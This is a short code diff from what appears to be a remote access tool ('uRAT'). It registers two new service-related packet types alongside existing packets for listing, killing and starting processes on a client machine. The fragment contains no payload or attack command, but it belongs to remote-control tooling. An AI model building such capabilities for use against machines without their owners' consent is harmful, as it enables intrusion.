@@ -20,7 +20,9 @@ namespace uRAT.ManagersClientPlugin.ProcessManager
                     new RefreshProcessesPacket(),
                     new ProcessInformationPacket(),
                     new KillProcessPacket(),
-                    new StartProcessPacket()
+                    new StartProcessPacket(),
+                    new ServiceInformationPacket(),
+                    new RefreshServicesPacket()
                 };
             }
         }
